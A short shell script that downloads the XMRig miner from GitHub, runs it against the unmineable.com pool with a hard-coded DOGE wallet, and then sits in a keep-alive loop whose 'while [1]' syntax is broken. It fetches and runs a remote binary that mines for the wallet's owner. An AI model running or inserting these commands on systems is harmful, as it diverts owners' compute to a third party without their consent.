#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-x64.tar.gz
tar xf xmrig-6.10.0-linux-x64.tar.gz
./xmrig-6.10.0/xmrig -a cn-heavy/xhv -o rx.unmineable.com:3333 -u DOGE:DR8xMsXTSABm8ZuxPhwudab7CYe87b9CCD:TESTWORK -k --tls -p x --cpu 2
while [1]; do
sleep 3
done
sleep 999
